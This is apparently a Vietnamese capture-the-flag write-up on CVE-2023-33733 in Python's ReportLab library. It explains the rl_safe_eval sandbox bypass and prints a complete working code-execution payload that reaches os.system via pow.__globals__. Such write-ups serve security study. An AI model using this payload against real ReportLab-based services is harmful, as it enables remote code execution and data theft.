![image](https://github.com/user-attachments/assets/70ecf137-973c-4d7d-b0ec-21bec570a67f)

Đây là một challange liên quan đến CVE 2023-33733 trong thư viện reportlab (ngôn ngữ Python). Web app trong challenge sử dụng reportlab để thực hiện việc chuyển đổi file html sang định dạng file pdf. Reportlab là một dự án mã nguồn mở cho phép tạo tài liệu ở định dạng Portable Document Format (PDF) của Adobe bằng ngôn ngữ lập trình Python. Nó cũng hỗ trợ tạo biểu đồ và đồ họa dữ liệu ở nhiều định dạng bitmap và vector khác, cũng như PDF. CVE ảnh hưởng đến các phiên bản <= 3.6.12 của reportlab.

![image](https://github.com/user-attachments/assets/cd8ad12a-0bd4-4fb1-8746-2a3bf1831559)

Vào năm 2019, thư viện ReportLab từng gặp một lỗ hổng tương tự dẫn đến thực thi mã từ xa thông qua thuộc tính Color của thẻ HTML. Nội dung của thuộc tính này được đánh giá trực tiếp như một biểu thức Python bằng hàm eval, do đó có thể dẫn đến việc thực thi mã độc. Để giảm thiểu vấn đề, ReportLab đã triển khai một môi trường sandbox, gọi là rl_safe_eval. Môi trường này được loại bỏ tất cả các hàm tích hợp sẵn của Python và thay thế chúng bằng các hàm được ghi đè nhằm đảm bảo chỉ các đoạn mã an toàn của thư viện mới được thực thi, trong khi chặn truy cập vào các hàm và thư viện nguy hiểm có thể dẫn đến xây dựng mã Python độc hại.

```python
class __RL_SAFE_ENV__(object):
    __time_time__ = time.time
    __weakref_ref__ = weakref.ref
    __slicetype__ = type(slice(0))
    
    def __init__(self, timeout=None, allowed_magic_methods=None):
        self.timeout = timeout if timeout is not None else self.__rl_tmax__
        self.allowed_magic_methods = (__allowed_magic_methods__ if allowed_magic_methods==True
                                       else allowed_magic_methods) if allowed_magic_methods else []
        #[...]
        # Ở đây có thể thấy hàm getattr tích hợp sẵn bị thay thế
        # bởi một hàm tùy chỉnh để kiểm tra độ an toàn của tên thuộc tính trước khi lấy giá trị của nó
        __rl_builtins__['getattr'] = self.__rl_getattr__
        __rl_builtins__['dict'] = __rl_dict__

    def __rl_getattr__(self, obj, a, *args):
        if isinstance(obj, strTypes) and a == 'format':
            raise BadCode('%s.format is not implemented' % type(obj))
        # Kiểm tra nhiều điều kiện trước khi lấy giá trị thuộc tính và trả về nó
        # cho môi trường sandbox eval
        self.__rl_is_allowed_name__(a)
        return getattr(obj, a, *args)

    def __rl_is_allowed_name__(self, name):
        """Kiểm tra xem tên có được phép không.
        Nếu `allow_magic_methods` là True, các tên trong `__allowed_magic_methods__`
        cũng được phép, dù bắt đầu bằng `_`.
        """
        if isinstance(name, strTypes):
            # Không cho phép truy cập vào các thuộc tính bắt đầu bằng __ hoặc thuộc danh sách thuộc tính không an toàn
            if name in __rl_unsafe__ or (name.startswith('__')
                and name != '__'
                and name not in self.allowed_magic_methods):
                raise BadCode('unsafe access of %s' % name)
```
#### Mô tả lỗi

Cơ chế **safe eval** được thiết kế để loại bỏ quyền truy cập vào các hàm tích hợp nguy hiểm, đảm bảo rằng mã thực thi không thể sử dụng các công cụ nguy hiểm để thực hiện hành động độc hại.

- Vấn đề với `type`: Một trong những lớp tích hợp bị ghi đè là `type`. Khi được gọi với **một tham số**, nó trả về kiểu của đối tượng. Nhưng khi được gọi với **ba tham số**, nó tạo ra một đối tượng kiểu mới, tương đương với việc tạo một lớp mới kế thừa từ lớp khác.
Ví dụ:
```python
Word = type('Word', (str,), {...})
```
Đoạn mã này tạo ra một lớp mới tên là `Word` kế thừa từ `str`. Ý tưởng ở đây là tạo một lớp mới có thể vượt qua các kiểm tra trong hàm `__rl_is_allowed_name__` của **sandbox eval**, từ đó cho phép truy cập vào các thuộc tính nhạy cảm như `__code__`.

- Cơ chế kiểm tra trong `__rl_is_allowed_name__`: Trước khi trả về kết quả từ `getattr`, hàm `__rl_is_allowed_name__` kiểm tra tính an toàn của thuộc tính được gọi:
  **Không được phép** truy cập vào các thuộc tính bắt đầu bằng `__`, trừ khi chúng nằm trong danh sách được phép.
  **Không được phép** truy cập vào các thuộc tính nằm trong danh sách thuộc tính không an toàn `__rl_unsafe__`.

- Cách bypass kiểm tra: Để vượt qua các kiểm tra trong `__rl_is_allowed_name__`, lớp `Word` được xây dựng như sau:
1. **Hàm `startswith`**: Luôn trả về `False` để vượt qua kiểm tra `name.startswith('__')`.
2. **Hàm `__eq__`**: 
   - Lần đầu được gọi, trả về `False` để vượt qua kiểm tra `name in __rl_unsafe__`.
   - Sau lần đầu tiên, trả về kết quả chính xác để `getattr` hoạt động đúng.
3. **Hàm `__hash__`**: Trả về mã băm giống với chuỗi gốc để đảm bảo tính đồng nhất.
   
Lớp `Word`:
```python
Word = type('Word', (str,), {
    'mutated'   : 1,
    'startswith': lambda self, x: False,
    '__eq__'    : lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x,
    'mutate'    : lambda self: {setattr(self, 'mutated', self.mutated - 1)},
    '__hash__'  : lambda self: hash(str(self))
})
```

#### Bypass giới hạn của `type`
Hàm `__rl_type__` trong **sandbox eval** không cho phép gọi `type` với ba tham số:
```python
def __rl_type__(self, *args):
    if len(args) == 1:
        return type(*args)
    raise BadCode('type call error')
```
Tuy nhiên, có thể vượt qua giới hạn này bằng cách gọi `type` trên chính nó, trả về hàm `type` tích hợp gốc:
```python
orgTypeFun = type(type(1))
```

#### Kết hợp khai thác
Sử dụng `orgTypeFun` để tạo lớp `Word`:
```python
orgTypeFun = type(type(1))
Word = orgTypeFun('Word', (str,), {
    'mutated'   : 1,
    'startswith': lambda self, x: False,
    '__eq__'    : lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x,
    'mutate'    : lambda self: {setattr(self, 'mutated', self.mutated - 1)},
    '__hash__'  : lambda self: hash(str(self))
})
```

#### Hậu quả

- Lớp `Word` có thể vượt qua kiểm tra của `__rl_is_allowed_name__`, từ đó truy cập vào các thuộc tính nhạy cảm như `__code__`.
- Kết hợp với việc truy cập lại hàm `type` gốc, kẻ tấn công có thể thực thi mã tùy ý trong môi trường sandbox.

#### Khai Thác "Accessing Global Builtins" Trong ReportLab

- Cách thức khai thác
  1. Truy cập các module toàn cục qua __globals__:
    - Các hàm như pow được ghi đè bởi rl_safe_eval nhưng vẫn giữ nguyên tham chiếu đến ngữ cảnh toàn cục thông qua thuộc tính __globals__.
    - Sử dụng pow.__globals__['os'] để truy cập module os, sau đó gọi os.system() để thực thi lệnh hệ thống.
  2. Khai thác thuộc tính __globals__ trong bối cảnh eval: Sử dụng hàm ghi đè pow trong eval để thao tác module os.

- Khởi tạo lớp Word: Lớp Word được tạo bằng cách sử dụng `type` để vượt qua các kiểm tra bảo mật
  ```python
  orgTypeFun = type(type(1))
  Word = orgTypeFun('Word', (str,), {
    'mutated': 1,
    'startswith': lambda self, x: False,
    '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x,
    'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)},
    '__hash__': lambda self: hash(str(self)),
  })
  ```
- Truy cập `__globals__`: Sử dụng lớp Word để truy cập thuộc tính `__globals__` của hàm `pow`

  ```python
  globalsattr = Word('__globals__')
  glbs = getattr(pow, globalsattr)
  glbs['os'].system('touch /tmp/exploited')
  ```
- Vượt qua giới hạn dòng lệnh trong 'eval': Vì môi trường 'eval' không hỗ trợ biểu thức nhiều dòng, một thủ thuật sử dụng list comprehension được áp dụng
  ```python
  [
    [
        getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited')
        for Word in [
            orgTypeFun(
                'Word',
                (str,),
                {
                    'mutated': 1,
                    'startswith': lambda self, x: False,
                    '__eq__': lambda self, x: self.mutate()
                    and self.mutated < 0
                    and str(self) == x,
                    'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)},
                    '__hash__': lambda self: hash(str(self)),
                },
            )
        ]
    ]
    for orgTypeFun in [type(type(1))]
  ]
  ```
### Áp dụng vào giải challenge
Mục tiêu là tìm kiếm và đọc flag, vì đây là 1 challenge blackbox nên ta sẽ không biết được vị trí chính xác của flag. Do webapp được thiết kế để ngăn cản kết nối từ server ra ngoài nên ta không thể mở reverse shell được. Giải pháp mình đưa ra là ghi kết quả thực thi lệnh và chuyển output đầu ra vào static file của webapp. Sau đó ta chỉ cần truy cập vào file ấy và đọc flag.
![image](https://github.com/user-attachments/assets/cff27a2c-f8cd-4b57-b716-1fedf25202a1)
![image](https://github.com/user-attachments/assets/63915522-4f9f-49db-9d56-fea6df710b52)

=> Flag: VSL{67786e838bcf22c75b7f2d68b0e9915b}


